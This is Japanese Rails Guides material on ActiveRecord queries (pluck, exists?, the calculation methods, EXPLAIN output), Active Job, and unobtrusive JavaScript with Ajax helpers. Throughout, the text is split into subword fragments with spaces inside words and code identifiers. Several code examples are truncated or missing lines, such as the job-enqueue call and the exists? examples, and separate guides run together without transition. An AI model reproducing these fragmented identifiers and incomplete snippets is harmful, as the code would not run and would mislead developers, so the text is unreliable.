▁ オブジェクト はまだ データベースに保存 されていない ため 、 生成される SQL は 以下のような もの になります 。
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s . first _ name ▁= ▁' N i c k ') ▁LIMIT ▁1
▁この オブジェクトを データベースに保存 したい場合は 、 単 に ` save ` を呼び出します 。
▁ n i c k . save
▁ SQL で 検索 する
▁ 独自の SQL を使用して レコード を 検索 したい場合 、` find _ by _ sql ` メソッド を使用できます 。
▁この ` find _ by _ sql ` メソッドは 、 オブジェクト の配列 を 1 つ 返します 。 クエリ が レコード を 1 つ しか 返 さ なかった 場合に も 配列 が返されます ので ご注意ください 。
▁たとえば 、 以下の クエリ を実行し た とします 。
▁Client . find _ by _ sql (" SELECT ▁* ▁FROM ▁clients
▁ IN N ER ▁JOIN ▁ orders ▁ ON ▁clients . id ▁= ▁ orders . client _ id
▁OR D ER ▁BY ▁clients . created _ at ▁ de sc ")
▁# ▁=> ▁[
▁#< Client ▁id : ▁1, ▁ first _ name : ▁" L u ca s " ▁ > ,
▁#< Client ▁id : ▁ 2, ▁ first _ name : ▁" J an " ▁ > ,
▁# ▁ ...
▁` find _ by _ sql ` は 、 カスタマイズ した データベース 呼び出し を 簡単な 方法で 提供し 、 インスタンス 化 された オブジェクト を返します 。
▁### ▁` select _ all `
▁` find _ by _ sql ` は ` connect ion # select _ all ` と 深 い 関係 があります 。 ` select _ all ` は ` find _ by _ sql ` と同様 、 カスタム SQL を使用して データベースから オブジェクト を取り出し ます が 、 取り出し た オブジェクトの インスタンス 化 を 行 わ ない 点が 異なります 。
▁ 代りに 、 ハッシュ の配列 を返します 。 1 つの ハッシュ が 1 レコード を表し ます 。
▁Client . connect ion . select _ all (" SELECT ▁ first _ name , ▁ created _ at ▁FROM ▁clients ▁WHERE ▁id ▁= ▁' 1 ' ")
▁ { " first _ name " => " R a fa e l ", ▁" created _ at " => " 20 12 - 11 - 10 ▁ 23 : 23 : 4 5 . 28 1 18 9 "} ,
▁ { " first _ name " => " E il e en ", ▁" created _ at " => " 20 1 3 - 12 - 0 9 ▁ 11 : 22 : 3 5 . 22 1 28 2 "}
▁### ▁` p l u c k `
▁` p l u c k ` は 、 1 つの モデル で 使用されている テーブル から カラム ▁( 1 つ でも 複 数 でも 可 ) ▁ を 取得 する クエリ を 送信 するのに 使用できます 。
▁ 引数として カラム 名 の リスト を与える と 、 指定 した カラム の値 の配列 を 、 対応する データ 型 で 返します 。
▁Client . where ( active : ▁true ). p l u c k (: id )
▁# ▁ SELECT ▁id ▁FROM ▁clients ▁WHERE ▁ active ▁= ▁1
▁# ▁=> ▁[1, ▁ 2, ▁3 ]
▁Client . d ist in ct . p l u c k (: r ol e )
▁# ▁ SELECT ▁D I S T IN C T ▁ r ol e ▁FROM ▁clients
▁# ▁=> ▁ [' admin ', ▁' member ', ▁' guest ']
▁Client . p l u c k (: id , ▁: name )
▁# ▁ SELECT ▁clients . id , ▁clients . name ▁FROM ▁clients
▁# ▁=> ▁[ [ 1 , ▁' David '] , ▁[ 2, ▁' J er e my '] , ▁[ 3, ▁' J o s e '] ]
▁` p l u c k ` を使用すると 、 以下のような コードを シンプルな もの に置き換え ることができます 。
▁Client . select (: id ). ma p ▁ { ▁| c | ▁c . id ▁ }
▁Client . select (: id ). ma p ( & : id )
▁Client . select (: id , ▁: name ). ma p ▁ { ▁| c | ▁[ c . id , ▁c . name ] ▁ }
▁ 上 は 以下 に置き換え られます 。
▁Client . p l u c k (: id )
▁` select ` と異なり 、` p l u c k ` は データベースから 受け 取 った 結果を 直接 Ruby の配列 に変換 してくれます 。 そのため の ` ActiveRecord ` オブジェクトを 事 前に 構成 しておく 必要はありません 。
▁従って 、 このメソッドは 大 規 模 な クエリ や 使用 頻 度 の 高 い クエリ で使用する と パ フ ォ ー マ ン ス が 向 上 します 。
▁ただし 、 オーバーライド を行なう モデル メソッドは 使用 できません 。
▁def ▁name
▁" 私 は # { s up er } "
▁Client . select (: name ). ma p ▁ & : name
▁# ▁=> ▁[" 私 は David ", ▁" 私 は J er e my ", ▁" 私 は J o s e "]
▁Client . p l u c k (: name )
▁# ▁=> ▁[" David ", ▁" J er e my ", ▁" J o s e "]
▁さらに ` p l u c k ` は 、` select ` などの ` Re l ation ` スコープ と異なり 、 クエリ を直接 トリガ する ので 、 その後 ろ に 他の スコープ を 連 鎖 する ことはできません 。 ただし 、 構成 済み の スコープ を ` p l u c k ` の 前 に置く ことは できます 。
▁Client . p l u c k (: name ). limit (1)
▁# ▁=> ▁ No M e th o d Error : ▁ un de f in ed ▁ method ▁` limit ' ▁for ▁#< Array : 0 x 00 7 f f 3 4 d 3 ad 6 d 8 >
▁Client . limit (1) . p l u c k (: name )
▁# ▁=> ▁[" David "]
▁### ▁` id s `
▁` id s ` は 、 テーブル の 主キー を使用する リレーション の ID をすべて 取り出す の に 使用できます 。
▁ Person . id s
▁# ▁ SELECT ▁id ▁FROM ▁ people
▁class ▁ Person ▁< ▁ActiveRecord :: Base
▁self . primary _ key ▁= ▁" person _ id "
▁# ▁ SELECT ▁ person _ id ▁FROM ▁ people
▁ オブジェクトの 存 在 チェック
▁ オブジェクト が存在する かどうか は 、` exists ?
▁このメソッドは 、` find ` と同様 の クエリ を使用して データベースに クエリ を送信し ます が 、 オブジェクトの コレクション の代わりに ` true ` または ` false ` を返します 。
▁` exists ?` は 複数の 値を 引数に 取 ることができます 。 ただし 、 それらの 値 のうち 1 つ でも 存 在 し ていれば 、 他の 値 が存在し て い なくても ` true ` を返します 。
▁id : ▁[1, 2, 3 ] )
▁name : ▁ [' John ', ▁' S er g e i '] )
▁` exists ?` メソッドは 、 引数 な し で モデル や リレーション に 使用 することもできます 。
▁Client . where ( first _ name : ▁' Ryan ') . exists ?
▁上の 例 では 、` first _ name ` が ' Ryan ' の クライアント が 1 人 でも い れば ` true ` を返し 、 それ以外の 場合は ` false ` を返します 。
▁Client . exists ?
▁上の 例 では 、` Client ` テーブル が 空 なら ` false ` を返し 、 それ以外の 場合は ` true ` を返します 。
▁ モデル や リレーション で の 存 在 チェック には ` any ?` や ` many ?` も 使用できます 。
▁# ▁ v i a ▁a ▁ model
▁Article . any ?
▁Article . many ?
▁# ▁ 名前付き スコープ を 経 由
▁Article . re c ent . any ?
▁Article . re c ent . many ?
▁# ▁ リレーション 経 由
▁Article . where ( publish ed : ▁true ). any ?
▁Article . where ( publish ed : ▁true ). many ?
▁# ▁ 関連付け 経 由
▁Article . first . cat e g or ies . any ?
▁Article . first . cat e g or ies . many ?
▁ 計算
▁この セクション では 冒 頭 で ` count ` メソッドを 例 に 取 って 説明 しています が 、 ここで 説明 されている オプションは 以下の すべての サブ セクション にも 該 当 します 。
▁ あらゆる 計算 メソッドは 、 モデル に対して 直接 実行されます 。
▁Client . count
▁# ▁ SELECT ▁ count ( * ) ▁A S ▁ count _ all ▁FROM ▁clients
▁ リレーション に対して も 直接 実行されます 。
▁Client . where ( first _ name : ▁' Ryan ') . count
▁# ▁ SELECT ▁ count ( * ) ▁A S ▁ count _ all ▁FROM ▁clients ▁WHERE ▁( first _ name ▁= ▁' Ryan ')
▁この 他にも 、 リレーション に対して さまざまな フ ァ イン ダ メソッドを使用して 複雑な 計算 を行なう ことができます 。
▁Client . include s (" orders ") . where ( first _ name : ▁' Ryan ', ▁ orders : ▁ { ▁ status : ▁' re ce ive d ' ▁ }) . count
▁上のコードは 以下 を実行します 。
▁ SELECT ▁ count ( D I S T IN C T ▁clients . id ) ▁A S ▁ count _ all ▁FROM ▁clients
▁ L E F T ▁ O UT ER ▁JOIN ▁ orders ▁ ON ▁ orders . client _ id ▁= ▁ client . id ▁WHERE
▁( client s . first _ name ▁= ▁' Ryan ' ▁ AND ▁ orders . status ▁= ▁' re ce ive d ')
▁### ▁ 個 数 を 数 え る
▁ モデルの テーブル に含まれる レコード の 個 数 を 数 え る には ` Client . count ` を使用できます 。 返される のは レコード の 個 数 です 。
▁ 特定の 年 齢 の クライアント の 数 を 数 え る のであれば 、` Client . count (: age ) ` とします
▁ オプション については 、 1 つ 上の [ 計算 ]( # 計算 ) セクション を参照してください 。
▁### ▁ 平 均
▁ テーブル に含まれる 特定の 数値 の 平 均 を得る には 、 その テーブル を持つ クラス に対して ` a ver age ` メソッド を呼び出します 。
▁このメソッド 呼び出し は 以下のような もの になります 。
▁Client . a ver age (" orders _ count ")
▁ 返される 値 は 、 その フィールド の 平 均 値 です 。 通常 3.1 4 1 59 2 6 5 のような 浮 動 小 数 点 になります 。
▁### ▁ 最 小 値
▁ テーブル に含まれる フィールド の 最 小 値 を得る には 、 その テーブル を持つ クラス に対して ` minimum ` メソッド を呼び出します 。
▁Client . minimum (" age ")
▁### ▁ 最大 値
▁ テーブル に含まれる フィールド の 最大 値 を得る には 、 その テーブル を持つ クラス に対して ` ma x im um ` メソッド を呼び出します 。
▁Client . ma x im um (" age ")
▁### ▁ 合 計
▁ テーブル に含まれる フィールド の すべての レコード における 合 計 を得る には 、 その テーブル を持つ クラス に対して ` sum ` メソッド を呼び出します 。
▁Client . sum (" orders _ count ")
▁ E X P L A IN を実行する
▁ リレーション によって トリガ される クエリ で E X P L A IN を実行する ことができます 。
▁ 以下 に 例 を示します 。
▁User . where ( id : ▁1 ). join s (: articles ). ex plain
▁ 以下のような 結果 が 生成されます 。
▁ E X P L A IN ▁for : ▁ SELECT ▁` users ` .
▁* ▁FROM ▁` users ` ▁ IN N ER ▁JOIN ▁` articles ` ▁ ON ▁` articles ` . ` user _ id ` ▁= ▁` users ` . ` id ` ▁WHERE ▁` users ` . ` id ` ▁= ▁1
▁+ ---- + - - ----------- + - - ---- ---- + - - - ---- + --------------- +
▁| ▁id ▁| ▁ select _ type ▁| ▁ table ▁| ▁type ▁| ▁ p o s s i b le _ keys ▁|
▁| ▁1 ▁| ▁S I M P L E ▁| ▁ users ▁| ▁ const ▁| ▁P R I M A R Y ▁|
▁| ▁1 ▁| ▁S I M P L E ▁| ▁ articles ▁| ▁A L L ▁| ▁ NULL ▁|
▁+ - ---- ---- + - ---- ---- + - - - ---- + - - ---- + - - ----------- +
▁| ▁ key ▁| ▁ key _ le n ▁| ▁ ref ▁| ▁ row s ▁| ▁ E x tr a ▁|
▁| ▁P R I M A R Y ▁| ▁4 ▁| ▁ const ▁| ▁1 ▁| ▁|
▁| ▁ NULL ▁| ▁ NULL ▁| ▁ NULL ▁| ▁1 ▁| ▁ U s ing ▁ where ▁|
▁2 ▁ row s ▁in ▁ set ▁( 0.0 0 ▁ sec )
▁上の 結果 は MySQL の場合 です 。
▁ PostgreSQL ア ダ プ タ で 同じ クエリ を実行すると 、 今度は 以下のような 結果 が 得られ ます 。
▁ E X P L A IN ▁for : ▁ SELECT ▁" users ".
▁* ▁FROM ▁" users " ▁ IN N ER ▁JOIN ▁" articles " ▁ ON ▁" articles ". " user _ id " ▁= ▁" users ". " id " ▁WHERE ▁" users ". " id " ▁= ▁1
▁ Q U ER Y ▁P L A N
▁ --------------- --------------- ---------------- ---------------- ----------------
▁ J o in ▁F il ter : ▁( articles . user _ id ▁= ▁ users . id )
▁-> ▁ In de x ▁S ca n ▁ us ing ▁ users _ p key ▁on ▁ users ▁( co st = 0.0 0 . . 8 . 27 ▁ row s = 1 ▁ w id th = 4 )
▁ In de x ▁C on d : ▁( id ▁= ▁1 )
▁-> ▁S e q ▁S ca n ▁on ▁ articles ▁( co st = 0.0 0 . . 28 . 88 ▁ row s = 8 ▁ w id th = 4 )
▁( 6 ▁ row s )
▁ 一 括 読み込み を 使用している と 、 内部で 複数の クエリ が トリガ される こと があり 、 一部の クエリ では その 前 の 結果を 必要 と する ことがあります 。
▁ このため 、` ex plain ` はこの クエリ を 実際に 実行 し 、 それ から クエリ プ ラ ン を 要求 します 。
▁User . where ( id : ▁1 ). include s (: articles ). ex plain
▁以下の 結果 を生成します 。
▁* ▁FROM ▁` users ` ▁WHERE ▁` users ` . ` id ` ▁= ▁1
▁+ ---- + - - ----------- + - - - ---- + - - - ---- + --------------- +
▁| ▁id ▁| ▁ select _ type ▁| ▁ table ▁| ▁type ▁| ▁ p o s s i b le _ keys ▁|
▁| ▁1 ▁| ▁S I M P L E ▁| ▁ users ▁| ▁ const ▁| ▁P R I M A R Y ▁|
▁+ - ---- ---- + - ---- ---- + - - - ---- + - - ---- + - - - ---- +
▁| ▁ key ▁| ▁ key _ le n ▁| ▁ ref ▁| ▁ row s ▁| ▁ E x tr a ▁|
▁| ▁P R I M A R Y ▁| ▁4 ▁| ▁ const ▁| ▁1 ▁| ▁|
▁1 ▁ row ▁in ▁ set ▁( 0.0 0 ▁ sec )
▁ E X P L A IN ▁for : ▁ SELECT ▁` articles ` .
▁* ▁FROM ▁` articles ` ▁WHERE ▁` articles ` . ` user _ id ` ▁ IN ▁ (1)
▁+ ---- + - - ----------- + - - ---- ---- + - - ---- + --------------- +
▁| ▁id ▁| ▁ select _ type ▁| ▁ table ▁| ▁type ▁| ▁ p o s s i b le _ keys ▁|
▁| ▁1 ▁| ▁S I M P L E ▁| ▁ articles ▁| ▁A L L ▁| ▁ NULL ▁|
▁+ - - ---- + - ---- ---- + - - ---- + - - ---- + - - ----------- +
▁| ▁ key ▁| ▁ key _ le n ▁| ▁ ref ▁| ▁ row s ▁| ▁ E x tr a ▁|
▁| ▁ NULL ▁| ▁ NULL ▁| ▁ NULL ▁| ▁1 ▁| ▁ U s ing ▁ where ▁|
▁### ▁ E X P L A IN の 出力結果 を 解 釈 する
▁ E X P L A IN の 出力 を 解 釈 すること は 、 本 ガイド の 範 疇 を 超 え ます 。
▁以下の 情報を 参 考 に してください 。
▁* ▁ SQLite 3 : ▁[ E X P L A IN ▁ Q U ER Y ▁P L A N ]( http :// www . sqlite . org / e q p . html )
▁* ▁ MySQL : ▁[ E X P L A IN ▁ O u t put ▁ Form at ]( http :// de v . my sql . com / doc / ref ma n / 5 . 6 / en / ex plain - out put . html )
▁* ▁ PostgreSQL : ▁[ U s ing ▁ E X P L A IN ]( http :// www . postgresql . org / doc s / current / static / us ing - ex plain . html )
▁Active ▁Job ▁ の基礎
▁= ================
▁ 本ガイドで は 、 バ ッ ク グ ラ ウ ンド で 実行 する ジョブ の作成 や キュー 登録 ▁( エ ン キュー : ▁ en que u e ) ▁ 、 実行 方法 について解説します 。
▁* ▁ ジョブ の作成 方法
▁* ▁ ジョブ の 登録 方法
▁* ▁ バ ッ ク グ ラ ウ ンド で の ジョブ 実行 方法
▁* ▁ アプリケーション から 非 同 期 に メールを送信 する方法
▁Active ▁Job は 、 ジョブ を 宣言 し 、 それ によって バ ッ ク エ ンド で さまざまな 方法 による キュー 操作 を実行する ための フレームワーク です 。
▁これらの ジョブ では 、 定 期 的な ク リ ー ン アップ を 始 め として 、 請 求 書 発 行 や メール 配信 など 、 どんな ことで も 実行 できます 。
▁これらの ジョブ を より 細 か な 作業 単 位 に 分割 して 並 列 実行 することもできます 。
▁-- ---------------- -----------
▁Active ▁Job の 主要な 目的 は 、 Rails アプリ を 即 席 で作成した 直 後 でも 使用できる 、 自 前 の ジョブ 管理 イン フ ラ を持つ ことです 。
▁これにより 、 D e la y ed ▁Job と Re s que などの ように 、 さまざまな ジョブ 実行 機能 の API の違い を 気 に せずに ジョブ フレームワーク 機能 や その他 の gem を 搭 載 すること が できるようになります 。
▁ バ ッ ク エ ンド で の キュー イン グ 作業 では 、 操作 方法 以外の ことを 気 に せずに 済み ます 。
▁さらに 、 ジョブ 管理 フレームワーク を 切り 替 え る 際に ジョブ を 書き 直 さ ずに 済み ます 。
▁ ジョブ を作成する
▁この セクション では 、 ジョブ の作成 方法 と ジョブ の 登録 ▁( en que u e ) ▁ 方法 を 手順 を 追 って 説明します 。
▁### ▁ ジョブ を作成する
▁Active ▁Job は 、 ジョブ 作成 用の Rails ジェネレータ を 提供し ています 。
▁$ ▁ bin / rails ▁ generate ▁ j o b ▁ guest s _ c le an up
▁create ▁app / j o b s / guest s _ c le an up _ j o b . rb
▁ 以下のように すると 、 特定の キュー に対して ジョブ を 1 つ 作成 できます 。
▁$ ▁ bin / rails ▁ generate ▁ j o b ▁ guest s _ c le an up ▁-- que u e ▁ ur g ent
▁ ジェネレータ を使用し たくない のであれば 、` app / j o b s ` の下に 自分 で ジョブ ファイル を作成する こともできます 。 ジョブ ファイル では 必ず ` Active J o b :: Base ` を継承し てください 。
▁ 作成された ジョブ は以下のようになります 。
▁class ▁ G u e st s C le an up J o b ▁< ▁Active J o b :: Base
▁ que u e _ as ▁: default
▁def ▁ perform ( * ar g s )
▁# ▁ 後 で 行なう
▁### ▁ ジョブ を キュー に 登録 する
▁ キュー への ジョブ 登録 は 以下のように 行います 。
▁to m or row
▁以上で 終わり です 。
▁ ジョブ を実行する
▁ ア ダ プ タ が 設定 されていない 場合 、 ジョブ は 直 ち に 実行されます 。
▁### ▁ バ ッ ク エ ンド
▁Active ▁Job には 、 S id e k i q 、 Re s que 、 D e la y ed ▁Job など さまざまな キュー イン グ バ ッ ク エ ンド に 接続 できる ア ダ プ タ が ビルトイン で 用意されてい ます 。
▁ 利用 可能な 最新の ア ダ プ タ の リスト については 、 API ドキュメント の [ Active J o b :: Q u e u e A d a p ter s ]( http :// api . rubyonrails . org / classes / Active J o b / Q u e u e A d a p ter s . html ) ▁ を参照してください 。
▁# ▁config / application . rb
▁ キュー
▁ 多くの ア ダ プ タ では 複数の キュー を扱う ことができます 。
▁Active ▁Job を使用することで 、 特定の キュー に 入 っている ジョブ を ス ケ ジ ュ ー リ ング することができます 。
▁ que u e _ as ▁: lo w _ p ri or ity
▁# . ...
▁` application . rb ` で 以下のように ` config . active _ j o b . que u e _ name _ prefix ` を使用することで 、 すべての ジョブ で キュー 名 の 前に 特定の 文字列 を追加する ことができます 。
▁config . active _ j o b . que u e _ name _ prefix ▁= ▁Rails . env
▁# ▁app / j o b s / guest s _ c le an up . rb
▁# ▁以上で 、 production 環境で は production _ lo w _ p ri or ity という キュー で ジョブ が
▁#
▁ M y J o b . set ( que u e : ▁: an other _ que u e ). perform _ la ter ( record )
▁class ▁ Proc ess V id e o J o b ▁< ▁Active J o b :: Base
▁ que u e _ as ▁do
▁ video ▁= ▁self . ar g um ent s . first
▁if ▁ video . own er . pre m i um ?
▁: pre m i um _ video j o b s
▁ else
▁: video j o b s
▁def ▁ perform ( video )
▁# ▁do ▁ process ▁ video
▁ Proc ess V id e o J o b . perform _ la ter ( V id e o . last )
▁NOT E : ▁ 設定 した キュー 名を キュー イン グ バ ッ ク エ ンド が 「 リ ッ ス ン する 」 ように してください 。
▁ 一部の バ ッ ク エ ンド では 、 リ ッ ス ン する キュー を指定する 必要がある もの があります 。
▁ コールバック
▁Active ▁Job は 、 ジョブ の ラ イ フ サ イ ク ル で の フック を提供します 。
▁これにより コールバック が 利用できる ので 、 ジョブ の ラ イ フ サ イ ク ル の間に 特定の ロ ジ ッ ク を トリガ できます 。
▁### ▁ 利用 可能な コールバック
▁* ▁` before _ en que u e `
▁* ▁` ar ound _ en que u e `
▁* ▁` after _ en que u e `
▁* ▁` before _ perform `
▁* ▁` ar ound _ perform `
▁* ▁` after _ perform `
▁### ▁ 使用 法
▁ before _ en que u e ▁do ▁| j o b |
▁# ▁ ジョブ インスタンス で 行なう 作業
▁ ar ound _ perform ▁do ▁| j o b , ▁ block |
▁# ▁ 実行 前に 行なう 作業
▁ block . c all
▁# ▁ 実行 後に 行なう 作業
▁Action ▁Mailer
▁ 最 近 の Web アプリケーションで よく 実行される ジョブ と い えば 、 リクエスト - レスポンス の サ イ ク ル の 外 で メールを送信 する ことでしょう 。 これにより 、 ユーザーが 送信 を 待 つ 必要 が なくなります 。
▁Active ▁Job は Action ▁Mailer と 統合 されている ので 、 非 同 期 メール 送信 を簡単に 行 え ます 。
▁# ▁ すぐ に メール 送信 したい場合は # deliver _ now を使用
▁User Mailer . welcome (@ user ). deliver _ now
▁# ▁Active ▁Job を使用して 後 で メール 送信 したい場合は # deliver _ la ter を使用
▁User Mailer . welcome (@ user ). deliver _ la ter
▁ G lo b al ID
▁Active ▁Job では G lo b al ID が パラメータ として サポート されています 。
▁ G lo b al ID を使用すると 、 動作 中 の Active ▁Record オブジェクトを ジョブ に 渡す 際に クラス と id を指定する 必要 が ありません 。 クラス と id を指定する 従来 の 方法 では 、 後 で 明示的に デ シ リ ア ラ イ ズ ▁( de s e ri al ize ) ▁ する必要が あり ました 。
▁ 従来 の ジョブ が 以下のような もの だ った とします 。
▁class ▁ T r a sh able C le an up J o b
▁def ▁ perform ( tr a sh able _ class , ▁ tr a sh able _ id , ▁ de p th )
▁ tr a sh able ▁= ▁ tr a sh able _ class . constantize . find ( tr a sh able _ id )
▁ tr a sh able . c le an up ( de p th )
▁ 現在 は 以下のように 簡潔 に 書く ことができます 。
▁def ▁ perform ( tr a sh able , ▁ de p th )
▁Active ▁ Model
▁ 例外
▁Active ▁Job では 、 ジョブ 実行 時に 発生 する 例外 を キャッチ する方法 が 1 つ 提供され ています 。
▁ re sc u e _ from ( ActiveRecord :: Re c or d No t F ound ) ▁do ▁| except ion |
▁# ▁ ここに 例外 処理 を 書く
▁Rails ▁ で ▁ JavaScript ▁ を使用する
▁ ================ ================
▁ 本ガイドで は 、 Rails に ビルトイン されている Ajax / JavaScript 機能 など について解説します 。 これら を 活用 して 、 リ ッ チ な 動的 Ajax アプリケーションを お 手 軽 に 作る ことができます 。
▁* ▁ Ajax の基礎
▁* ▁ 「 控 え め な JavaScript 」 について
▁* ▁Rails の ビルトイン ヘルパー の 活用 方法
▁* ▁ サーバー 側 で Ajax を扱う 方法
▁* ▁ Turbolinks ▁gem
▁ --------------- ---------------- ---------------- ---------------- ----------------
▁ は じ め て の Ajax
▁--------- ---------------
▁ Ajax を理解する には 、 Web ブラウザ の 基本的な 動作 について 理解 しておく必要があります 。
▁ ブラウザ の アドレス バー に ` http :// localhost : 3 000 ` と 入力 して ' G o ' を 押 す と 、 ブラウザ ▁( つまり クライアント ) ▁ は サーバー に対して リクエストを 1 つ 送信 します 。
▁ ブラウザ は 、 サーバー から 受け 取 った レスポンス を 解 析 し 、 続いて 必要な すべての アセット ▁( JavaScript ファイル 、 スタイルシート 、 画像 ) ▁ を サーバー から 取得 します 。
▁続いて ブラウザ は ページを 組 み 立 て ます 。
▁ ブラウザ に 表示 されている リンクをクリックすると 、 同じ プロセス が 実行されます 。 ブラウザ は ページ を取得し 、 続いて アセット を取得し 、 それら をすべて まとめ て から 結果 を表示します 。
▁これ が 、 い わ ゆ る 「 リクエスト - レスポンス 」 の サ イ ク ル です 。
▁ JavaScript も 、 上 と同様に サーバー に リクエスト を送信し 、 レスポンス を 解 析 することができます 。
▁ JavaScript は ページ 上の 情報を 更新 することもできます 。
▁ JavaScript の 開発者 は 、 ブラウザ と JavaScript という 2 つの 力 を 1 つ に 結 集 させる ことで 、 現在の Web ページ の一部 だけ を更新する ことができます 。 必要な Web ページを サーバー から すべて 取得 する必要はありません 。
▁この 強力な 技 法 が 、 Ajax と 呼ばれ ている ものです 。
▁Rails には 、 JavaScript を さらに 使い や す く した CoffeeScript が デフォルトで 組 み 込 まれ ています 。 以後 、 本ガイドで はすべて の例 を CoffeeScript で 記述 します 。
▁もちろん 、 これらの レ ッ ス ン はすべて 通常の JavaScript にも 適 用 できます 。
▁ 例 として 、 j Query ライブラリ を使用して Ajax リクエストを 送信 する CoffeeScript コード を以下に示します 。
▁` ` ` coffee script
▁$ . ajax ( url : ▁" / test ") . d one ▁( html ) ▁->
▁$ (" # re s ul t s ") . app end ▁ html
▁上のコードは ▁" / test " ▁ から データ を取得し 、 結果を Web ページ 上の ` re s ul t s ` という id を持つ ` div ` タグ に 押 し 込 み ます 。
▁Rails には 、 この種の 技 法 を Web ページ 作成 で使用する ための サポート が 多 数 ビルトイン されています 。
▁従って 、 こう した コードを すべて 自分 で 作成する 必要 は ほとんど ありません 。
▁ この後 、 このような 手法 で Rails ▁Web サイト を作成する 方法 を ご 紹 介 します 。 これらの 手法 は 、 いずれ も シンプルな 基本 テクニック の う え に 成 り 立 っています 。
▁ 「 控 え め な JavaScript 」
▁ ----------- ----------- ---------------
▁Rails では 、 JavaScript を D O M に追加する 際 の 手法 を 「 控 え め な ▁( un o b tr us ive ) ▁ JavaScript 」 と 呼 んで います 。
▁これは 一般に フ ロ ン ト エ ンド 開発者 コ ミ ュ ニ テ ィ で ベ スト プ ラ ク テ ィ ス である と 見 な されています が 、 ここでは もう少し 違 う 角 度 から 説明 したい と思います 。
▁ 最も シンプルな JavaScript を 例 にとって 考えてみましょう 。
▁ 以下のような 書き 方は ' イン ラ イン JavaScript ' と 呼ばれ ています 。
▁< a ▁ href =" # " ▁on c li c k =" this . style . b ack g r ound Co l or =' # 99 0 000 ' "> P a in t ▁it ▁ re d </ a >
▁この リンクをクリックすると 、 背 景 が 赤 く なります 。
▁しかし 早 く も ここで 問題が生じ 始 め ます 。 クリック した 時に JavaScript で もっと い ろ ん な ことを させる と どう な る でしょう か 。
▁< a ▁ href =" # " ▁on c li c k =" this . style . b ack g r ound Co l or =' # 00 99 00 ' ; this . style . c ol or =' # F F F F F F ' ; "> P a in t ▁it ▁ g re en </ a >
▁ だ い ぶ 乱 雑 になっ てきました 。
▁ では ここで 関数 定義 を c li c k ハ ンド ラ の 外 に 追 い 出 し 、 CoffeeScript で 書き 換 え てみましょう 。
▁ p a in t I t ▁= ▁( e le m ent , ▁ b ack g r ound Co l or , ▁ text Co l or ) ▁->
▁ e le m ent . style . b ack g r ound Co l or ▁= ▁ b ack g r ound Co l or
▁if ▁ text Co l or ?
▁ e le m ent . style . c ol or ▁= ▁ text Co l or
▁ ページ の内容 は 以下の とおりです 。
▁< a ▁ href =" # " ▁on c li c k =" p a in t I t ( this , ▁' # 99 0 000 ') "> P a in t ▁it ▁ re d </ a >
▁これで コードが だ い ぶ 良 く なりました 。 しかし 、 同じ 効果 を 複数の リンク に 与え ると どう な る でしょう か 。
▁< a ▁ href =" # " ▁on c li c k =" p a in t I t ( this , ▁' # 00 99 00 ', ▁' # F F F F F F ') "> P a in t ▁it ▁ g re en </ a >
▁< a ▁ href =" # " ▁on c li c k =" p a in t I t ( this , ▁' # 0 000 99 ', ▁' # F F F F F F ') "> P a in t ▁it ▁ b l u e </ a >
▁これで は D R Y とは 言 え ません 。
▁今度は イベント を 活用 して 改良 してみましょう 。
▁最初に ` data - * ` 属性を リンク に追加 しておきます 。 続いて 、 この 属性 を持つ すべての リンク で 発生 する クリック イベント に ハ ンド ラ を バ イン ド します 。
▁$ (" a [ data - b ack g r ound - c ol or ] ") . c li c k ▁( e ) ▁->
▁ e . prev ent D e fa ul t ( )
▁ b ack g r ound Co l or ▁= ▁$ ( this ). data (" b ack g r ound - c ol or ")
▁ text Co l or ▁= ▁$ ( this ). data (" text - c ol or ")
▁ p a in t I t ( this , ▁ b ack g r ound Co l or , ▁ text Co l or )
▁< a ▁ href =" # " ▁ data - b ack g r ound - c ol or =" # 00 99 00 " ▁ data - text - c ol or =" # F F F F F F "> P a in t ▁it ▁ g re en </ a >
▁< a ▁ href =" # " ▁ data - b ack g r ound - c ol or =" # 0 000 99 " ▁ data - text - c ol or =" # F F F F F F "> P a in t ▁it ▁ b l u e </ a >
▁ 私 た ち はこの 手法 を 「 控 え め な JavaScript 」 と 呼 んで います 。 この 名 称 は 、 HTML の中に JavaScript を 混 入 させ ない という 意 図 に 由 来 しています 。
▁ JavaScript を 正しく 分 離 する ことができ たので 、 今後 の 変更 が 容易に なりました 。
▁ 今後 は 、 この ` data - * ` 属性を リンク タグ に追加する だけで この 動作 を簡単に 追加 できます 。
▁Rails では 、 こう した 最小化 と 連 結 を使用することで 、 あらゆる JavaScript を 実行 できます 。
▁ JavaScript コードは Rails の あらゆる Web ページ で ま る ご と バ ンド ル されます 。 つまり 、 ページ が 最初に ブラウザ に 読み込まれ る ときに ダウンロード され 、 以後 は ブラウザで キャッシュ されます 。
▁これにより 多くの 利 点が 得られ ます 。
▁Rails チ ー ム は 、 本ガイドで ご 紹 介 した 方法で CoffeeScript と JavaScript を使用すること を 強 く 推 奨 いた します 。 多くの JavaScript ライブラリ も この 方法で 利用できる ことが 期 待 できます 。
▁ 組み込み ヘルパー
▁ HTML 生成 を行い 易 く するために 、 Ruby で 記述 された さまざまな ビュー ヘルパーメソッド が 用意されてい ます 。
▁ それらの HTML 要素 に Ajax コードを 若 干 追加 した く な った ときに も 、 Rails が ち ゃ ん と サポート してくれます 。
▁Rails の JavaScript は 、「 控 え め な JavaScript 」 原 則 に基いて 、 JavaScript による 要素 と Ruby による 要素 の 2 つの 要素 で 構成 されています 。
▁ JavaScript による 要素 は [ rails . js ]( https :// github . com / rails / jquery - u js / b lo b / master / s r c / rails . js ) であり 、 Ruby による 要素 である 正 規 の ビュー ヘルパー によって D O M に 適切な タグ が追加され ます 。
▁これにより rails . js に含まれる CoffeeScript が D O M の 属性を リ ッ ス ン する ように なり 、 それらの 属性 に 適切な ハ ンド ラ が与えられ ます 。
▁### ▁ form _ for
▁[ ` form _ for ` ]( http :// api . rubyonrails . org / classes / ActionView / Helper s / Form Helper . html # method - i - form _ for ) ▁ は フォーム 作成 を 支 援 する ヘルパー です 。
▁` form _ for ` は 、 JavaScript を 利用 するための `: remote ` オプションを 引数に 取 ることができます 。
▁` ` ` erb
▁<%= ▁ form _ for (@ article , ▁ remote : ▁true ) ▁do ▁| f | ▁%>
▁ ...
▁<% ▁end ▁%>
▁上のコード から 以下の HTML が 生成されます 。
▁< form ▁ accept - cha r set =" UT F - 8 " ▁ action =" / articles " ▁class =" new _ article " ▁ data - remote =" true " ▁id =" new _ article " ▁ method =" post ">
▁</ form >
▁ form タグ に ` data - remote =" true " ` という 属性 が追加され ている ことにご注目ください 。
